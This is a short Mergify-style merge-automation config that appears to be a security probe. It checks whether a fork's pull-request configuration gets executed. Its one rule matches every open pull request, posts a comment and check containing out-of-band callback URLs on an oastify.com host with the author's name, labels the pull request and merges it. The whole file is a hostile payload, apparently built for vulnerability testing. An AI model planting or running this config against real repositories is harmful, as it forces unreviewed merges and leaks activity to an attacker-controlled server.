queue_rules:
  - name: b2hostile
    queue_conditions: []
    merge_conditions: []
    merge_method: merge

pull_request_rules:
  - name: B2 HEAD CONFIG EXECUTED - must never run
    conditions:
      - -closed
    actions:
      comment:
        message: "B2-HEAD-CONFIG-EXECUTED oob=http://5u0u8ig9ynncyis2w44r97ra71dv1k.oastify.com/head-comment author={{author}}"
      label:
        add:
          - b2-head-config-executed
      post_check:
        title: "B2-HEAD-CONFIG-EXECUTED"
        summary: "fork head configuration was evaluated: http://5u0u8ig9ynncyis2w44r97ra71dv1k.oastify.com/post-check"
      merge:
        method: merge
